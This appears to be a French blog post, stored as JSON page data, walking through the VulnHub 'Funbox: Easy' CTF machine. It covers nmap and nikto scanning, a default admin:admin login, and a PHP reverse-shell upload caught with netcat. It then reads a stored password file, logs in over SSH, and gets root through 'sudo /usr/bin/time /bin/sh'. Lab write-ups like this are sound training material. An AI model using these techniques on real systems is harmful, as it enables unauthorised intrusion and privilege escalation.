{"hash":"250f333e9ef0347f8247956a19dfdff7c411a751","data":{"post":{"title":"CTF Funbox: Easy","date":"25 April 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.1</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.58</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir FunboxEasy &amp;&amp; cd FunboxEasy</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -sV -sT -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nNmap scan report <span class=\"token keyword\">for</span> funbox3.home <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.1.58<span class=\"token punctuation\">)</span>\nHost is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00052s latency<span class=\"token punctuation\">)</span>.\nNot shown: <span class=\"token number\">65532</span> closed ports\nPORT      STATE SERVICE VERSION\n<span class=\"token number\">22</span>/tcp    <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">8</span>.2p1 Ubuntu 4ubuntu0.1 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp    <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.41 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Ubuntu<span class=\"token punctuation\">))</span></span>\n<span class=\"token number\">33060</span>/tcp <span class=\"token function\">open</span>  mysqlx?</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un serveur <strong>SSH</strong> sur le port <strong>22</strong> , un serveur <strong>Apache 2</strong> sur le port <strong>80</strong> et un serveur <strong>MySQL</strong> sur le port <strong>33060</strong>.</p>\n<p>Astuce : vous pouvez ajouter le domaine <em>funbox3.home</em> dans le fichier <code class=\"language-text\">/etc/hosts</code> avec <strong>Vim</strong> (ou un autre éditeur de texte).</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> /etc/hosts\n<span class=\"token number\">192.168</span>.1.58    funbox3.home</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Scannons le port <strong>80</strong> avec <strong>Nikto</strong> pour avoir d'eventuelles informations sur la sécurité du serveur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nikto -h http://<span class=\"token variable\">$IP</span> -o nikto.txt\n+ Server: Apache/2.4.41 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class=\"token keyword\">in</span> a different fashion to the MIME <span class=\"token builtin class-name\">type</span>\n+ Cookie PHPSESSID created without the httponly flag\n+ No CGI Directories found <span class=\"token punctuation\">(</span>use <span class=\"token string\">'-C all'</span> to force check all possible <span class=\"token function\">dirs</span><span class=\"token punctuation\">)</span>\n+ <span class=\"token string\">\"robots.txt\"</span> contains <span class=\"token number\">1</span> entry <span class=\"token function\">which</span> should be manually viewed.\n+ Multiple index files found: /index.html, /index.php\n+ Server may leak inodes via ETags, header found with <span class=\"token function\">file</span> /, inode: 2aa6, size: 5abac58e39aeb, mtime: <span class=\"token function\">gzip</span>\n+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST\n+ OSVDB-3092: /admin/: This might be interesting<span class=\"token punctuation\">..</span>.\n+ OSVDB-3092: /secret/: This might be interesting<span class=\"token punctuation\">..</span>.\n+ OSVDB-3092: /store/: This might be interesting<span class=\"token punctuation\">..</span>.\n+ OSVDB-3093: /admin/index.php: This might be interesting<span class=\"token punctuation\">..</span>. has been seen <span class=\"token keyword\">in</span> web logs from an unknown scanner.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Sur la page <a href=\"http://funbox3.home/store\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">/store</a>, en bas il y a un lien \"Admin login\" qui amène sur <a href=\"http://funbox3.home/store/admin.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">/store/admin.php</a> et en essayant avec \"admin:admin\", ça passe du premier coup. En cliquant sur \"Add new book\", on peut uploader un fichier quelconque. On prépare donc un webshell en PHP.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class=\"token builtin class-name\">.</span>\n$ <span class=\"token function\">vim</span> php-reverse-shell.php\n/<span class=\"token variable\">$ip</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Puis on lance un serveur <strong>Netcat</strong> sur le port <strong>1234</strong> (ou celui de votre choix) <code class=\"language-text\">nc -lnvp 1234</code>.</p>\n<p>En cherchant où les fichiers sont uploadés, on trouve le lien du répertoire <a href=\"http://funbox3.home/store/bootstrap/img\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">/store/bootstrap/img</a>. On clique sur notre webshell afin de l'exécuter.</p>\n<h2>Pénétration</h2>\n<p>Dans le terminal avec <strong>Netcat</strong>, la connexion avec le serveur est établi.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ python3 -c <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span>\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">33</span><span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">33</span><span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">33</span><span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>En remontant dans le répertoire \"/home\", on découvre un utilisateur \"tony\" avec un fichier \"password.txt\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /home/tony/password.txt\nssh: yxcvbnmYYY\ngym/admin: asdfghjklXXX\n/store: admin@admin.com admin</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On tente la connexion SSH.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> tony@localhost\ntony@localhost's password: yxcvbnmYYY</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>On regarde les privilèges que possèdent cet utilisateur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> -l\nUser tony may run the following commands on funbox3:\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/yelp\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/dmf\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/whois\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/rlogin\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/pkexec\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/mtr\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/finger\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/time\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/cancel\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD:\n/root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Sur <a href=\"https://gtfobins.github.io/gtfobins/time/#sudo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GTFOBins</a>, on regarde quelle commande permet d'utiliser la commande \"time\" en tant que \"sudo\" dans le terminal.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> /usr/bin/time /bin/sh\n$ python3 -c <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span>\n<span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Dans le répertoire de l'utilisateur \"root\", on trouve le flag dans le fichier \"root.flag\" <code class=\"language-text\">cat /root/root.flag</code>.</p>\n","download":"https://www.vulnhub.com/entry/funbox-easy,526","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":4,"parts":[{"title":"CTF Funbox: Easy","href":""},{"title":"CTF Funbox: Script Kiddie","href":"ctf-funbox-script-kiddie"}]}},"context":{}}